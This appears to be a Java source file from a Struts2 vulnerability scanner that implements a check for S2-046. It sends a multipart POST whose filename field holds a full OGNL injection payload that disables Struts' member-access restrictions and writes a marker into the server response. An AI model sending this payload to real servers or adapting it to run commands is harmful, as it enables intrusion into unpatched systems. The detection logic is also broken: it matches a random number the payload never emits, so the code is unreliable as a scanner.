package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_046 implements Check {
    public String printInfo(){
        String info = "[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        Map<String,String> headers = new HashMap<String,String>();

        int number = new Random(10000).nextInt(10000);

        String poc_data = "-----------------------------7e116d19044c\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"+
                "\nContent-Type: text/plain\n" +
                "\n" +
                "x\n" +
                "-----------------------------7e116d19044c--";
        String content = "multipart/form-data; boundary=---------------------------7e116d19044c";



        headers.put("Content-Type",content);


        String url = protocol+"://"+host+":"+port+path;

        try {
            HttpResult result= HttpClient.post(url,poc_data.getBytes(),headers);;
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m =p.matcher(result.getData());

            if(m.find()){
                return true;
            }else{
                return false;
            }

        }catch (Exception e){
            return false;
        }




        }



}
